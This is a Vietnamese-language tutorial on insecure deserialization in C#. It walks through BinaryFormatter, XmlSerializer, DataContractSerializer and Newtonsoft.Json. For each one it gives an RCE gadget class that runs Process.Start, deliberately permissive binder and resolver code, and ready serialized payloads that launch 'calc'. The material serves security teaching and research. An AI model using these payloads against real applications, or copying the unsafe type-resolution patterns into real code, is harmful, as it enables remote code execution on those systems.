# **DESERIALIZATION TRONG C#**

* Hoặc ...
  * Hoặc ...

1. Và ...
2. Và ...

## Danh sách formatter

* [BinaryFormatter](#binaryformatter)

* [XmlSerializer](#xmlserializer)

* [DataContractSerializer](#datacontractserializer)

* [Newtonsoft.Json.JsonConvert](#newtonsoftjsonjsonconvert)

* Các formatter khác trong .NET đều có các yêu cầu tương tự hoặc gọi đến 4 formatter bên trên

#### **GADGET RCE SỬ DỤNG TRONG BÀI**

```C#
using System;
using System.Runtime.Serialization;

namespace RCENs
{
	[Serializable]
	public class RCE
	{
		public RCE() {}

		public RCE(SerializationInfo info, StreamingContext context) {}

		public RCE(string text)
		{
			this._cmd = text;
		}

		private string _cmd;

		public string cmd
		{
			get
			{
				return this._cmd;
			}
			set
			{
				this._cmd = value;
				// this.Run(); // use in XmlSerializer
			}
		}

		private void Run()
		{
			System.Diagnostics.Process.Start(this._cmd);
		}

		[OnDeserializing]
		public void During(StreamingContext context) {}

		[OnDeserialized]
		public void Done(StreamingContext context)
		{
			this.Run();
		}

		public void OnDeserialization(object sender) {}

		public void GetObjectData(SerializationInfo info,  StreamingContext context) {}
	}
}

namespace main
{
	public class main
	{
		static void Main(string[] args)
		{
			MemoryStream stream = new MemoryStream();
			string serial = "...";
			T a = Go.Deserial<T>(serial, ...);
			return;
		}
	}
}
```

### ***`BinaryFormatter`***

Sử dụng Reflector trong khi deserialize

Điều kiện:

* Không có `Binder` (`Binder` mang giá trị `null`): không cần điều kiện nào thêm

* Có `Binder`:
  1. `BindToType()` phải trả về kiểu dữ liệu của đối tượng cần đạt được hoặc có thể trả về null khi deserialize đến đối tượng đó
  2. Properties chứa gadget cần có:
	  * Kiểu dữ liệu là `object`,...
	  * Kiểu dữ liệu bất kỳ nhưng `setter` đã được ghi đè

Demo code:

```C#
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using RCENs;

namespace BinaryFormatterNs
{
	[Serializable]
	public class BinFormat
	{
		public BinFormat(string text)
		{
			this.strProp = text;
		}

		/*
		public object strProp
		{
			get; set;
		}
		*/

		public string strProp
		{
			set
			{ }
		}
	}

	public class Binder : SerializationBinder
	{
		public override Type BindToType(string assemblyName, string typeName)
		{
			string types = string.Format("{0}, {1}", typeName, assemblyName);
			if (types.Length == 70)
				return typeof(RCE);
			return typeof(BinFormat);
			//return null;
		}
	}

	public class Go
	{
		public static string Serial(MemoryStream stream, string text)
		{
			BinFormat a = new BinFormat(text);
			BinaryFormatter format = new BinaryFormatter();
			format.Serialize(stream, a);
			return Convert.ToBase64String(stream.ToArray());
		}

		public static T Deserial<T>(string value) where T : class
		{
			byte[] buffer = Convert.FromBase64String(value);
			BinaryFormatter format = new BinaryFormatter();
			format.Binder = new Binder();
			MemoryStream serialStream = new MemoryStream(buffer);
			T result = format.Deserialize(serialStream) as T;
			return result;
		}
	}
}

// "AAEAAAD/////AQAAAAAAAAAMAgAAADt0ZXN0LCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAG0JpbmFyeUZvcm1hdHRlck5zLkJpbkZvcm1hdAEAAAAYPHN0clByb3A+a19fQmFja2luZ0ZpZWxkAgIAAAAJAwAAAAUDAAAACVJDRU5zLlJDRQEAAAAEX2NtZAECAAAABgQAAAAEY2FsYws="
```

### ***`XmlSerializer`***

Sử dụng các setter trong quá trình deserialize. Không sử dụng cùng các interface. Chỉ serialize các public property có setter

Điều kiện:

* Bắt buộc phải điều khiển được kiểu dữ liệu ở constructor vào của `XmlSerializer`. Tức là các kiểu dữ liệu dẫn đến gadget phải được truyền vào thuộc tính `XmlSerializer.mapping`

Demo code:

```C#
using System;
using System.IO;
using System.Text;
using System.Xml.Serialization;

namespace XmlSerNs
{
	[Serializable]
	public class XmlSer
	{
		public XmlSer(){}

		public XmlSer(int id = 0, string name = "name")
		{
			this.id = id;
			this.name = name;
		}

		public object name { get; set; }

		public int id { get; set; }
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			XmlSer a = new XmlSer(1, "calc");
			XmlSerializer format = new XmlSerializer(typeof(XmlSer));
			format.Serialize(stream, a);
			return Encoding.UTF8.GetString(stream.ToArray());
		}

		public static T Deserial<T>(string value, string type) where T : class
		{
			// type = "RCENs.RCE";
			byte[] buffer = Encoding.UTF8.GetBytes(value);
			XmlSerializer format = new XmlSerializer(Type.GetType(type));
			MemoryStream serialStream = new MemoryStream(buffer);
			object a = format.Deserialize(serialStream);
			return a as T;
		}
	}
}

// "<?xml version=\"1.0\"?><RCE xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><cmd>calc</cmd></RCE>"
```

### ***`DataContractSerializer`***

Sử dụng các setter trong quá trình deserialize. Sử dụng được với các interface

Có thuộc tính:

* `DataContract`: Chỉ (de)serialize các property có thuộc tính `DataMember`, khi deserialize thì chỉ những property nào có thuộc tính `DataMember` mới được gọi đến setter

* `Serializable`: (de)serialize được mọi property

Điều kiện:

* Điều khiển được kiểu dữ liệu trong constructor tương tự `XmlSerializer`

* Chứa các property có kiểu dữ liệu `object`,... và:
  * `DataContractResolver` có method `ResolveName()` trả về kiểu dữ liệu của gadget
  * Kiểu dữ liệu của gadget có trong thuộc tính `KnownType`

* Ngoài ra các method được override trong `DataContractSurrogated` có thể ảnh hưởng đến việc (de)serialize như casting sang đối tượng khác, đổi formatter, export ra file,... (có thể xem thêm mục TypeConvert trong series phân tích gadget [hiện chưa có])

Demo code:

```C#
using System;
using System.IO;
using System.Xml;
using System.Text;
using System.Runtime.Serialization;

namespace DataConNs
{
	[DataContract]
	[KnownType(typeof(RCENs.RCE))]
	class DataCon
	{
		public DataCon()
		{
			this.obj = "obj";
			this.id = "id";
		}

		[DataMember]
		private string id;

		[DataMember]
		public object obj { get; set; }
	}

	class Resolver : DataContractResolver
	{
		public override Type ResolveName(string typeName, string typeNamespace, Type declaredType, DataContractResolver knownTypeResolver)
		{
			Type type = Type.GetType(typeName, false);
			return type;
		}

		public override bool TryResolveType(Type type, Type declaredType, DataContractResolver knownTypeResolver, out XmlDictionaryString typeName, out XmlDictionaryString typeNamespace)
		{
			string name = type.FullName;
			string namesp = type.Assembly.FullName;
			typeName = new XmlDictionaryString(XmlDictionary.Empty, name, 0);
			typeNamespace = new XmlDictionaryString(XmlDictionary.Empty, namesp, 0);
			return true;
		}
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			DataCon a = new DataCon();
			DataContractSerializer format = new DataContractSerializer(typeof(DataCon));
			format.WriteObject(stream, a);
			return Encoding.UTF8.GetString(stream.ToArray());
		}

		public static T Deserial<T>(string value) where T : class
		{
			byte[] buffer = Encoding.UTF8.GetBytes(value);
			// DataContractSerializer format = new DataContractSerializer(typeof(T));
			DataContractSerializer format = new DataContractSerializer(typeof(T), new DataContractSerializerSettings
			{
				DataContractResolver = new Resolver()
			});
			MemoryStream serialStream = new MemoryStream(buffer);
			object a = format.ReadObject(serialStream);
			return a as T;
		}
	}
}
/*
Serializable: "<DataCon xmlns=\"http://schemas.datacontract.org/2004/07/DataConNs\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><a>1</a><id i:nil=\"true\"/><obj i:type=\"a:RCE\" xmlns:a=\"http://schemas.datacontract.org/2004/07/RCENs\"><a:_cmd>calc</a:_cmd></obj></DataCon>"

DataMember: "<DataCon xmlns=\"http://schemas.datacontract.org/2004/07/DataConNs\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><a>1</a><id i:nil=\"true\"/><obj i:type=\"a:RCE\" xmlns:a=\"http://schemas.datacontract.org/2004/07/RCENs\"><a:cmd>calc</a:cmd></obj></DataCon>"

Resolver: "<DataCon xmlns=\"http://schemas.datacontract.org/2004/07/DataConNs\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><id i:nil=\"true\"/><obj i:type=\"a:RCENs.RCE\" xmlns:a=\"test, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\"><_cmd xmlns=\"http://schemas.datacontract.org/2004/07/RCENs\">calc</_cmd></obj></DataCon>"
*/
```

### ***`Newtonsoft.Json.JsonConvert`***

Sử dụng constructor và setter trong quá trình deserialize. Sử dụng được với các interface. Chỉ các property có scope là public khi (de)serialize mới được gọi tới setter

Điều kiện:

* `TypeNameHandling` có các giá trị: `Arrays`, `Objects`, `Auto`, `All` và property có kiểu dữ liệu `object`,...

* Nếu `TypeNameHandling` có giá trị `None` thì property cần có kiểu dữ liệu `System.Data.EntityKeyMember` hoặc các kiểu dữ liệu kế thừa nó

Demo code:

```C#
using System.IO;
using Newtonsoft.Json;

namespace JsonNs
{
	public class Json
	{
		public Json() {}

		public string id
		{
			get;
			set;
		}

		[JsonProperty(TypeNameHandling = TypeNameHandling.None)]
		public System.Data.EntityKeyMember a;
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			Json a = new Json();
			return JsonConvert.SerializeObject(a);
		}

		public static T Deserial<T>(string value) where T : class
		{
			T a = JsonConvert.DeserializeObject<T>(value);
			return a;
		}
	}
}

/*
Arrays | Objects | Auto | All: "{\"$type\":\"JsonNs.Json, test\",\"a\":{\"$type\":\"RCENs.RCE, test\",\"cmd\":\"calc\"},\"id\":\"123\"}"

None: "{\"a\":{\"Key\":\"key\",\"Type\":\"RCENs.RCE, test\",\"Value\":{\"cmd\":\"calc\"}},\"id\":\"123\"}"
*/
```

## Tham khảo

* https://klezvirus.github.io/Advanced-Web-Hacking/Serialisation/

* https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
